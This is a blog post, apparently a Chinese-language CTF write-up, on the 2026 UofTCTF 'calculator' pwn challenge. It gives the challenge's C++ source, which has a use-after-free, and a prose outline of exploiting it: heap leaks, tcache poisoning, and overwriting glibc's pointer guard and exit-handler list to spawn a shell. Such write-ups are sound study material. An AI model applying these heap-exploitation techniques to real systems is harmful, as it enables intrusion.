@@ -1,0 +1,668 @@
+
+  <!DOCTYPE html>
+  <html lang="en"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"copy success(*^▽^*)","fail":"copy failed (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"Naup"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    2026 UoFCTF - caculator |
+    
+    堇姬 Naup&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="2026 UoFCTF - caculator Author: 堇姬 Naup  前言前幾天 @consolebreak 跑來問我這題，看了一下好像蠻有趣的就來寫了一下，沒想到我就這樣卡住了兩天，最後還是解出來了，其中主要卡在最後拿到任意寫後，unordered map 內的 std::string 拿到了非法位置的 pointer，最後解構要去釋放時候會觸發 glibc 檢查導致 crash，以">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2026 UoFCTF - caculator">
+<meta property="og:url" content="http://example.com/2026/02/12/2026-UoFCTF-caculator/index.html">
+<meta property="og:site_name" content="堇姬 Naup&#39;s Blog">
+<meta property="og:description" content="2026 UoFCTF - caculator Author: 堇姬 Naup  前言前幾天 @consolebreak 跑來問我這題，看了一下好像蠻有趣的就來寫了一下，沒想到我就這樣卡住了兩天，最後還是解出來了，其中主要卡在最後拿到任意寫後，unordered map 內的 std::string 拿到了非法位置的 pointer，最後解構要去釋放時候會觸發 glibc 檢查導致 crash，以">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-02-12T04:42:34.000Z">
+<meta property="article:modified_time" content="2026-02-12T04:43:05.457Z">
+<meta property="article:author" content="Naup堇姬">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="堇姬 Naup's Blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/fav.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">Naup...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">Home</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">Archives</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">About</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="https://i.postimg.cc/bJwcgqPx/131939316-p0.jpg" alt="2026 UoFCTF - caculator">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">2026 UoFCTF - caculator</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2026-UoFCTF-caculator"><span class="toc-number">1.</span> <span class="toc-text">2026 UoFCTF - caculator</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analyze-source-code"><span class="toc-number">1.2.</span> <span class="toc-text">Analyze source code</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#challenge"><span class="toc-number">1.3.</span> <span class="toc-text">challenge</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploit"><span class="toc-number">1.4.</span> <span class="toc-text">exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ref"><span class="toc-number">1.5.</span> <span class="toc-text">ref</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Naup堇姬" class="lazyload">
+  <div class="sidebar-author-name">Naup堇姬</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">89</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">21</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-email sidebar-social-icon">
+      <a href=naup96721@gmail.com itemprop="url" target="_blank" aria-label="email" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/Naupjjin itemprop="url" target="_blank" aria-label="github" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-2026-UoFCTF-caculator" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2026/02/12/2026-UoFCTF-caculator/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2026-02-12T04:42:34.000Z" itemprop="datePublished">2026-02-12</time>
+    <time style="display: none;" id="post-update-time">2026-02-12</time>
+  </a>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="2026-UoFCTF-caculator"><a href="#2026-UoFCTF-caculator" class="headerlink" title="2026 UoFCTF - caculator"></a>2026 UoFCTF - caculator</h1><blockquote>
+<p>Author: 堇姬 Naup</p>
+</blockquote>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前幾天 @consolebreak 跑來問我這題，看了一下好像蠻有趣的就來寫了一下，沒想到我就這樣卡住了兩天，最後還是解出來了，其中主要卡在最後拿到任意寫後，unordered map 內的 std::string 拿到了非法位置的 pointer，最後解構要去釋放時候會觸發 glibc 檢查導致 crash，以至於沒辦法打 IO_FILE，如果有人知道怎麼打 IO_FILE 在這題可以私訊我XD<br>總之好玩，最後找到可以用一個酷酷的地方來 get shell  </p>
+<h2 id="Analyze-source-code"><a href="#Analyze-source-code" class="headerlink" title="Analyze source code"></a>Analyze source code</h2><p><a target="_blank" rel="noopener" href="https://github.com/UofTCTF/uoftctf-2026-chals-public/tree/main/calculator">https://github.com/UofTCTF/uoftctf-2026-chals-public/tree/main/calculator</a></p>
+<p>這是一個 C++ 的 binary pwn，有一個很神秘的通過 unordered map 來記憶 expression 的結果並去計算<br>其中的問題是傳入的 vector 是一個 pointer，但如果在過程中， vector 發生擴容，那就會用到舊的 address，導致 UAF  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Int128</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">    __int128 v;</span><br><span class="line">    Int128(__int128 x = <span class="number">0</span>) : v(x) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> Int128 <span class="title function_">fromstring</span><span class="params">(<span class="type">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; s)</span> &#123;</span><br><span class="line">        __int128 val = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c : s) val = val * <span class="number">10</span> + (c - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> Int128(val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> <span class="title function_">tostring</span><span class="params">()</span> <span class="type">const</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (v == <span class="number">0</span>) <span class="keyword">return</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">        __int128 x = v;</span><br><span class="line">        <span class="type">bool</span> neg = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123; neg = <span class="literal">true</span>; x = -x; &#125;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span> s;</span><br><span class="line">        <span class="keyword">while</span> (x) &#123; s.push_back(<span class="string">&#x27;0&#x27;</span> + x % <span class="number">10</span>); x /= <span class="number">10</span>; &#125;</span><br><span class="line">        <span class="keyword">if</span> (neg) s.push_back(<span class="string">&#x27;-&#x27;</span>);</span><br><span class="line">        reverse(s.begin(), s.end());</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Int128 operator+(<span class="type">const</span> Int128&amp; o) <span class="type">const</span> &#123; <span class="keyword">return</span> Int128(v + o.v); &#125;</span><br><span class="line">    Int128 operator-(<span class="type">const</span> Int128&amp; o) <span class="type">const</span> &#123; <span class="keyword">return</span> Int128(v - o.v); &#125;</span><br><span class="line">    Int128 operator*(<span class="type">const</span> Int128&amp; o) <span class="type">const</span> &#123; <span class="keyword">return</span> Int128(v * o.v); &#125;</span><br><span class="line">    Int128 operator/(<span class="type">const</span> Int128&amp; o) <span class="type">const</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (o.v == <span class="number">0</span>) throw <span class="built_in">std</span>::runtime_error(<span class="string">&quot;Division by zero&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> Int128(v / o.v);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="keyword">class</span> <span class="title">Op</span> &#123;</span> ADD, SUB, MUL, DIV &#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">unordered_map</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>, <span class="type">size_t</span>&gt; memo;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Int128&gt; memo_vec;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">getMemo</span><span class="params">(<span class="type">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; s)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!memo.count(s))</span><br><span class="line">        memo[s] = memo_vec.size();</span><br><span class="line">    memo_vec.push_back(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> memo[s];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isNumber</span><span class="params">(<span class="type">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; s)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">char</span> c : s) <span class="keyword">if</span> (!<span class="built_in">isdigit</span>(c)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Int128 <span class="title function_">eval</span><span class="params">(<span class="type">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; L, Op op, <span class="type">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; R, Int128&amp; memo_l, Int128&amp; memo_r)</span>;</span><br><span class="line"></span><br><span class="line">Int128 <span class="title function_">evalAtom</span><span class="params">(<span class="type">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; s, Int128&amp; memo_s)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (isNumber(s)) &#123;</span><br><span class="line">        memo_s = Int128::fromstring(s);</span><br><span class="line">        <span class="keyword">return</span> memo_s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find lowest-precedence operator from right</span></span><br><span class="line">    <span class="type">int</span> best = <span class="number">-1</span>, prec = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.size(); i++) &#123;</span><br><span class="line">        <span class="type">int</span> p = (s[i]==<span class="string">&#x27;+&#x27;</span>||s[i]==<span class="string">&#x27;-&#x27;</span>) ? <span class="number">1</span> :</span><br><span class="line">                (s[i]==<span class="string">&#x27;*&#x27;</span>||s[i]==<span class="string">&#x27;/&#x27;</span>) ? <span class="number">2</span> : <span class="number">100</span>;</span><br><span class="line">        <span class="keyword">if</span> (p &lt;= prec) &#123; prec = p; best = i; &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (best == <span class="number">-1</span>) &#123;</span><br><span class="line">        throw <span class="built_in">std</span>::runtime_error(<span class="string">&quot;Bad expression&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> L = s.substr(<span class="number">0</span>, best);</span><br><span class="line">    L.erase(remove_if(L.begin(), L.end(), ::<span class="built_in">isspace</span>), L.end());</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> R = s.substr(best+<span class="number">1</span>);</span><br><span class="line">    R.erase(remove_if(R.begin(), R.end(), ::<span class="built_in">isspace</span>), R.end());</span><br><span class="line"></span><br><span class="line">    Op op = (s[best] == <span class="string">&#x27;+&#x27;</span>) ? Op::ADD :</span><br><span class="line">            (s[best] == <span class="string">&#x27;-&#x27;</span>) ? Op::SUB :</span><br><span class="line">            (s[best] == <span class="string">&#x27;*&#x27;</span>) ? Op::MUL : Op::DIV;</span><br><span class="line"></span><br><span class="line">    memo_s = eval(L, op, R, memo_vec[getMemo(L)], memo_vec[getMemo(R)]);</span><br><span class="line">    <span class="keyword">return</span> memo_s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Int128 <span class="title function_">eval</span><span class="params">(<span class="type">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; L, Op op, <span class="type">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; R, Int128&amp; memo_l, Int128&amp; memo_r)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (memo_l.v == <span class="number">0</span>)</span><br><span class="line">        memo_l = evalAtom(L, memo_l);</span><br><span class="line">    <span class="keyword">if</span> (memo_r.v == <span class="number">0</span>)</span><br><span class="line">        memo_r = evalAtom(R, memo_r);</span><br><span class="line">    Int128 res;</span><br><span class="line">    <span class="keyword">if</span> (op == Op::ADD) res = memo_l + memo_r;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (op == Op::SUB) res = memo_l - memo_r;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (op == Op::MUL) res = memo_l * memo_r;</span><br><span class="line">    <span class="keyword">else</span> res = memo_l / memo_r;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span> s;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter expression (or quit): &quot;</span>;</span><br><span class="line">        getline(<span class="built_in">std</span>::<span class="built_in">cin</span>, s);</span><br><span class="line">        <span class="keyword">if</span> (s == <span class="string">&quot;quit&quot;</span>) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Bye!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (s == <span class="string">&quot;reset&quot;</span>) &#123;</span><br><span class="line">            memo = <span class="built_in">std</span>::<span class="built_in">unordered_map</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>, <span class="type">size_t</span>&gt;();</span><br><span class="line">            memo_vec = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Int128&gt;();</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        try &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">string</span> res = evalAtom(s, memo_vec[getMemo(s)]).tostring();</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Result = &quot;</span> &lt;&lt; res &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125; catch (<span class="built_in">std</span>::exception&amp; e) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Error: &quot;</span> &lt;&lt; e.what() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="challenge"><a href="#challenge" class="headerlink" title="challenge"></a>challenge</h2><p>基本上就是通過 UAF 先去通過 result leak 資料，情境是 <code>memo_s = eval(L, op, R, memo_vec[getMemo(L)], memo_vec[getMemo(R)]);</code>，需要讓左邊剛好擴容時候，去算右邊，這樣右邊就會用到舊的，並且他要是第一個才能 leak fd&#x2F;bk 上的 heap pointer<br>另外一邊則是先將 heap vector 一路往上加到 free 後會進入 unsorted bin，剩下的就是一樣的方法<br>要 UAF 寫入 free chunk 則需要剛好 memo_s 是舊的 pointer，排一下就行了，我們希望寫入一個 pointer 來打 tcache poinsoning，我選擇將他 allocate 到 tcache_pthread_struct 上，來控制更多 entry 下一個會 allocate 的 chunk (上面的需要去平衡一下 cnt，需要預先讓 std::string allocate 一些之後 reset 讓這些都被 free 到 tcache entry)<br>我們可以通過這樣做出兩次任意寫，但我們拿到一個非法位置 chunk 後，如果想打 IO_FILE，當我 exit，<code>__run_exit_handler</code> 會去從 initial 內拿出解構子來去釋放一些 pointer，其中就有非法 pointer 會導致 free 失敗<br>因此我選擇直接控制 fs_base + 0x30 上的 key，跟 initial 結構  </p>
+<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.41/source/stdlib/exit.c#L108">https://elixir.bootlin.com/glibc/glibc-2.41/source/stdlib/exit.c#L108</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">case</span> ef_cxa:</span><br><span class="line">    <span class="comment">/* To avoid dlclose/exit race calling cxafct twice (BZ 22180),</span></span><br><span class="line"><span class="comment">we must mark this function as ef_free.  */</span></span><br><span class="line">    f-&gt;flavor = ef_free;</span><br><span class="line">    cxafct = f-&gt;func.cxa.fn;</span><br><span class="line">    arg = f-&gt;func.cxa.arg;</span><br><span class="line">    PTR_DEMANGLE (cxafct);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">    __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">    cxafct (arg, status);</span><br></pre></td></tr></table></figure>
+
+<p>這邊將 fs_base 控制成都是 0，他會將 exit_function 上的 function pointer (0x10) 拿出來 xor <code>fs:[0x30]</code>，之後右移 0x11，另外 arg 是 0x18，控制成 &#x2F;bin&#x2F;sh address 就可以在解構時候成功開 shell  </p>
+<p>上述的結構其實就是這兩個結構<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.41/source/stdlib/exit.h#L55">https://elixir.bootlin.com/glibc/glibc-2.41/source/stdlib/exit.h#L55</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">size_t</span> idx;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> <span class="title">fns</span>[32];</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.41/source/stdlib/exit.h#L34">https://elixir.bootlin.com/glibc/glibc-2.41/source/stdlib/exit.h#L34</a></p>
